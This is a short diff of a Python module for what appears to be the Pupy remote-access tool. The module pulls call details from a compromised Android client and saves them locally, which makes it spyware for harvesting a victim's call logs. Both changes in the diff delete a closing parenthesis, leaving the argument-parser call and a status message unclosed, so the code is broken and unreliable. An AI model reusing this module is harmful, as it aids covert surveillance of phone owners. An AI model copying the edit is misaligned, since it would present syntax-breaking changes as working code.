@@ -16,7 +16,7 @@ class call(PupyModule):
     MISSED_TYPE = "3"
 
     def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='call', description=self.__doc__)
+        self.arg_parser = PupyArgumentParser(prog='call', description=self.__doc__
         self.arg_parser.add_argument('-a', '--get-all', action='store_true', help='get all call details')
         self.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will store targtet's postions (default: %(default)s)")
 
@@ -25,7 +25,7 @@ class call(PupyModule):
         self.client.load_package("pupydroid.call")
         path = getLocalAndroidPath(self.client, args)
         if args.get_all==True:
-            self.success("Getting call details...")
+            self.success("Getting call details..."
             callDetails = self.client.conn.modules['pupydroid.call'].getCallDetails()
             self.success("{0} call details got. Saving...".format(len(callDetails)))
             completePath = os.path.join(path, 'callDetails.txt')
